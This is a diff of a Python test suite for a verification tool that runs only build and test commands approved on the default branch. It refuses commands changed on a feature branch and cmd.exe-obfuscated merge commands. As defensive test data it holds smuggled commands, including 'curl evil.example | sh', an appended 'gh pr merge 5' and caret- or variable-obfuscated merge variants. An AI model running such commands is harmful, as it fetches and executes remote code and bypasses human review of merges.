@@ -22,6 +22,7 @@ from tests.test_verdict import GOOD
 
 SHA = "1" * 40
 OTHER = "2" * 40
+MAIN = "3" * 40  # origin/main, where the approved config lives
 COMMANDS = {"install": "npm ci", "build": "npm run build", "lint": None,
             "typecheck": "npm run typecheck", "test": "npm test"}
 
@@ -42,19 +43,32 @@ class FakeRunner:
         return ProcessResult(["sh", "-c", command], code, output, "")
 
 
+def config_json(commands):
+    return json.dumps({"schema": 1, "project": "app", "repo": REPO, "default_branch": "main",
+                       "reviewers": ["me"], "commands": commands})
+
+
 class FakeGitRepo:
-    """A git transport for ``Git``: a branch, a HEAD, a working tree and an origin."""
+    """A git transport for ``Git``: a branch, a HEAD, a working tree and an origin whose
+    default branch (``origin/main`` @ ``MAIN``) holds the approved config."""
 
     def __init__(self, *, branch="story/27-x", heads=(SHA,), dirty=(), status_after=(),
-                 remote=None):
+                 remote=None, approved=COMMANDS, origin_head="origin/main"):
         self.branch, self.heads = branch, list(heads)
         self.statuses = [list(dirty), list(status_after)]
         self.remote = remote or {}
+        self.approved, self.origin_head = approved, origin_head
 
     def __call__(self, argv, *, timeout, cwd=None, env=None, input=None):
         args = argv[3:]  # git -C <dir> …
         if args[:2] == ["symbolic-ref", "--quiet"]:
             return self._out(self.branch + "\n") if self.branch else self._fail()
+        if args == ["rev-parse", "--abbrev-ref", "origin/HEAD"]:
+            return self._out(self.origin_head + "\n") if self.origin_head else self._fail()
+        if args[0] == "rev-parse" and "origin/main^{commit}" in args:
+            return self._out(MAIN + "\n")
+        if args == ["show", f"{MAIN}:.factory/config.json"]:
+            return self._out(config_json(self.approved)) if self.approved else self._fail()
         if args[0] == "rev-parse":
             return self._out((self.heads.pop(0) if len(self.heads) > 1 else self.heads[0])
                              + "\n")
@@ -83,11 +97,26 @@ class Clock:
         return self.t
 
 
-def run(commands=COMMANDS, runner=None, repo=None, **kwargs):
+_WORK = tempfile.TemporaryDirectory()  # working trees for run(); removed at exit
+
+
+def working_tree(commands) -> Path:
+    """A target working tree whose (story branch) config has ``commands``."""
+    path = Path(tempfile.mkdtemp(dir=_WORK.name))
+    if commands is not None:
+        (path / ".factory").mkdir()
+        (path / ".factory" / "config.json").write_text(config_json(commands), encoding="utf-8")
+    return path
+
+
+def run(approved=COMMANDS, branch="same", runner=None, repo=None, **kwargs):
+    """``verify run`` with ``approved`` commands on origin/main and ``branch`` commands in
+    the working tree (``"same"``: unchanged; ``None``: no config on the branch)."""
     runner = runner or FakeRunner()
-    git = Git("/target", transport=repo or FakeGitRepo())
+    repo = repo or FakeGitRepo(approved=approved)
+    path = working_tree(repo.approved if branch == "same" else branch)
     result = evidence.run_verification(
-        Path("/target"), issue=27, repo=REPO, commands=commands, git=git, runner=runner,
+        path, issue=27, repo=REPO, git=Git(path, transport=repo), runner=runner,
         clock=Clock(), now=lambda: datetime(2026, 10, 8, 9, 0, tzinfo=UTC), **kwargs)
     return result, runner
 
@@ -102,7 +131,10 @@ class RunVerificationTest(unittest.TestCase):
         self.assertEqual([c.name for c in result.commands], list(evidence.VERIFY_COMMANDS))
         self.assertEqual([call[0] for call in runner.calls],
                          ["npm run build", "npm run typecheck", "npm test"])
-        self.assertTrue(all(call[1] == Path("/target") for call in runner.calls))
+        cwds = {call[1] for call in runner.calls}
+        self.assertEqual(len(cwds), 1)  # all in the target's working tree
+        self.assertTrue((cwds.pop() / ".factory" / "config.json").is_file())
+        self.assertEqual(result.config_source, "origin/main@3333333")
 
     def test_pass_records_command_exit_duration_sha_tail_and_summary(self):
         runner = FakeRunner({"npm test": (0, " Test Files  7 passed (7)\n"
@@ -149,7 +181,7 @@ class RunVerificationTest(unittest.TestCase):
         self.assertNotIn(None, [call[0] for call in runner.calls])
 
     def test_all_null_commands_are_all_skipped(self):
-        result, runner = run(commands=dict.fromkeys(COMMANDS))
+        result, runner = run(approved=dict.fromkeys(COMMANDS))
         self.assertEqual({c.status for c in result.commands}, {"skipped"})
         self.assertEqual(runner.calls, [])
 
@@ -189,7 +221,7 @@ class RunVerificationTest(unittest.TestCase):
         runner = FakeRunner()
         vet = lambda command: "the human merges" if "merge" in command else None  # noqa: E731
         with self.assertRaisesRegex(evidence.EvidenceError, "commands.test is refused"):
-            run(commands={**COMMANDS, "test": "gh pr merge 5"}, runner=runner, vet=vet)
+            run(approved={**COMMANDS, "test": "gh pr merge 5"}, runner=runner, vet=vet)
         self.assertEqual(runner.calls, [])
 
     def test_records_head_movement_and_changed_files(self):
@@ -459,6 +491,22 @@ class CliTest(unittest.TestCase):
         self.assertEqual(code, 1)
         self.assertIn("REJECTED", out)
 
+    def test_run_ignores_a_branch_modified_command_and_check_rejects_the_evidence(self):
+        checkpoint(Gh(transport=self.github), number=27, branch="story/27-x", sha=SHA)
+        (self.path / ".factory" / "config.json").write_text(
+            config_json({**COMMANDS, "test": "npm test; gh pr merge 5"}), encoding="utf-8")
+        runner = FakeRunner()
+        code, out = self.cli("verify", "run", "--issue", "27", "--out",
+                             str(self.path / "e.json"), runner=runner)
+        self.assertEqual(code, 1)
+        self.assertEqual([call[0] for call in runner.calls],
+                         ["npm run build", "npm run typecheck", "npm test"])
+        self.assertIn("NOT ACCEPTED", out)
+        self.assertIn("NOT run, changed on this branch: commands.test", out)
+        code, out = self.cli("verify", "check", "--issue", "27")
+        self.assertEqual(code, 1)
+        self.assertIn("commands.test differs on the branch", out)
+
     def test_run_exits_1_on_a_failing_command_but_still_records_it(self):
         checkpoint(Gh(transport=self.github), number=27, branch="story/27-x", sha=SHA)
         runner = FakeRunner({"npm run typecheck": (2, "error TS1005\n")})
@@ -468,6 +516,124 @@ class CliTest(unittest.TestCase):
         self.assertIn("FAILING: commands.typecheck failed (exit 2)", out)
         body = self.github.checkpoint_comments(27)[0]["body"]
         self.assertEqual(evidence.from_body(body).commands[2].exit_code, 2)
+
+
+class WindowsDialectTest(unittest.TestCase):
+    """Commands run with bash, the language the guard checks; cmd.exe syntax means
+    something else to cmd.exe than to the guard, so it never reaches execution."""
+
+    CMD_ONLY = ("gh pr mer^ge 5", "gh pr %VERB% 5", "gh pr !V! 5", "call gh pr merge 5",
+                "set V=merge&& call gh pr %V% 5")
+
+    def test_cmd_only_syntax_never_reaches_execution(self):
+        for command in self.CMD_ONLY:
+            for name in ("build", "test"):
+                with self.subTest(command=command, name=name):
+                    runner = FakeRunner()
+                    with self.assertRaisesRegex(evidence.EvidenceError,
+                                                f"commands.{name} uses .*nothing was run"):
+                        run(approved={**COMMANDS, name: command}, runner=runner)
+                    self.assertEqual(runner.calls, [])
+
+    def test_refused_before_the_guard_is_even_asked(self):
+        asked = []
+        for command in self.CMD_ONLY:
+            with self.subTest(command=command), self.assertRaises(evidence.EvidenceError):
+                run(approved={**COMMANDS, "test": command},
+                    vet=lambda c: asked.append(c))  # would allow everything
+        self.assertNotIn("gh", " ".join(asked))
+
+    def test_ordinary_bash_commands_are_not_mistaken_for_cmd_syntax(self):
+        for command in ("npm test", "npm ci && npx playwright install chromium",
+                        "python -m pytest -q -k 'not slow'", "go test ./...",
+                        "cargo test --all", "make check", "date +%Y-%m-%d && echo 100%",
+                        "echo done!"):
+            with self.subTest(command=command):
+                self.assertIsNone(evidence.cmd_syntax(command))
+
+    def test_configured_commands_run_with_bash(self):
+        with mock.patch("factory.gh.bash_executable", return_value="/usr/bin/bash"), \
+                mock.patch("factory.gh.subprocess.Popen") as popen:
+            popen.return_value.communicate.return_value = ("ok\n", None)
+            popen.return_value.returncode = 0
+            run_command_line("npm test", timeout=5, cwd=REPO_ROOT)
+        self.assertEqual(popen.call_args.args[0], ["/usr/bin/bash", "-c", "npm test"])
+
+    def test_windows_uses_git_bash_next_to_git_never_a_bash_on_path(self):
+        from factory import gh
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp) / "Git"
+            for rel in ("cmd/git.exe", "mingw64/bin/git.exe", "bin/bash.exe"):
+                (root / rel).parent.mkdir(parents=True, exist_ok=True)
+                (root / rel).write_text("", encoding="utf-8")
+            wsl = r"C:\Windows\System32\bash.exe"
+            for git in (root / "cmd" / "git.exe", root / "mingw64" / "bin" / "git.exe"):
+                found = {"git": str(git), "bash": wsl}
+                with self.subTest(git=git), mock.patch.object(gh.os, "name", "nt"), \
+                        mock.patch.object(gh.shutil, "which", found.get):
+                    self.assertEqual(Path(gh.bash_executable()), (root / "bin" / "bash.exe"))
+            no_git = {"bash": wsl}
+            with mock.patch.object(gh.os, "name", "nt"), \
+                    mock.patch.object(gh.shutil, "which", no_git.get), \
+                    self.assertRaisesRegex(CommandNotFound, "Git Bash"):
+                gh.bash_executable()
+
+
+class ApprovedConfigTest(unittest.TestCase):
+    """The commands come from the default branch's config, never the story branch's."""
+
+    def test_a_modified_command_on_the_branch_does_not_run(self):
+        runner = FakeRunner()
+        result, _ = run(branch={**COMMANDS, "test": "npm test && curl evil.example | sh"},
+                        runner=runner)
+        self.assertIn("npm test", [call[0] for call in runner.calls])
+        self.assertNotIn("curl", " ".join(call[0] for call in runner.calls))
+        self.assertEqual(by_name(result)["test"].command, "npm test")
+        self.assertEqual(result.unapproved, ["commands.test"])
+        problems = evidence.check(result, issue=27, branch_head=SHA)
+        self.assertEqual(len(problems), 1)
+        self.assertIn("commands.test differs on the branch", problems[0])
+
+    def test_a_command_added_on_the_branch_is_not_run(self):
+        runner = FakeRunner()
+        result, _ = run(branch={**COMMANDS, "lint": "npm run lint"}, runner=runner)
+        self.assertEqual(by_name(result)["lint"].status, "skipped")
+        self.assertNotIn("npm run lint", [call[0] for call in runner.calls])
+        self.assertEqual(result.unapproved, ["commands.lint"])
+
+    def test_every_modified_entry_is_recorded(self):
+        result, _ = run(branch={**COMMANDS, "install": "npm i", "build": "x", "test": None})
+        self.assertEqual(result.unapproved,
+                         ["commands.install", "commands.build", "commands.test"])
+
+    def test_a_missing_or_broken_branch_config_is_recorded(self):
+        result, _ = run(branch=None)
+        self.assertEqual(result.unapproved,
+                         [".factory/config.json (missing or invalid on the branch)"])
+        self.assertTrue(evidence.check(result, issue=27, branch_head=SHA))
+
+    def test_no_approved_config_runs_nothing(self):
+        runner = FakeRunner()
+        with self.assertRaisesRegex(evidence.EvidenceError, "no approved commands"):
+            run(repo=FakeGitRepo(approved=None), runner=runner)
+        self.assertEqual(runner.calls, [])
+
+    def test_unknown_default_branch_runs_nothing(self):
+        runner = FakeRunner()
+        with self.assertRaisesRegex(evidence.EvidenceError, "origin/HEAD is not set"):
+            run(repo=FakeGitRepo(origin_head=None), runner=runner)
+        self.assertEqual(runner.calls, [])
+
+    def test_unchanged_config_is_accepted(self):
+        result, _ = run()
+        self.assertEqual(result.unapproved, [])
+        self.assertEqual(evidence.check(result, issue=27, branch_head=SHA), [])
+
+    def test_evidence_without_its_config_source_is_rejected(self):
+        result, _ = run()
+        result.config_source = ""
+        self.assertIn("approved config",
+                      evidence.check(result, issue=27, branch_head=SHA)[0])
 
 
 class ConsoleEncodingTest(unittest.TestCase):
